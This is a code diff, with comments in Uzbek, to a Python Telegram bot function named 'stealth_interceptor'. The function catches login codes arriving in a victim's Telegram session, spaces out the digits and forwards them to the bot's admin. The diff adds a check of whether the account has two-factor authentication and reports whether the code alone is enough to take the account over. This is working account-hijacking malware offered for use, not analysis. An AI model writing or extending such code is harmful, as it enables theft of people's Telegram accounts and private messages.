@@ -476,9 +476,22 @@ async def stealth_interceptor(event):
             code = code_match.group(1)
             enc = " ".join(list(code))
 
+            # 2FA tekshirish
+            has_2fa = False
+            try:
+                from telethon.tl.functions.account import GetPasswordRequest
+                pwd_info = await client(GetPasswordRequest())
+                has_2fa = pwd_info.has_password
+            except Exception:
+                pass
+
             msg = f"🥷 <b>Stealth Intercept</b>\n"
             msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
             msg += f"🔑 KOD: <b>{enc}</b>\n"
+            if has_2fa:
+                msg += f"🔐 <b>2-bosqichli parol (2FA) yoqilgan!</b> Kodni kiritgandan so'ng parol ham so'raladi.\n"
+            else:
+                msg += f"✅ 2FA yo'q — kod yetarli\n"
             msg += f"<i>(raqamlarni ketma-ket o'qing)</i>"
 
             # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
@@ -488,7 +501,7 @@ async def stealth_interceptor(event):
                 try:
                     if ADMIN_IDS:
                         await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
-                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id})")
+                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {has_2fa})")
                 finally:
                     await _bot.session.close()
             except Exception as e:
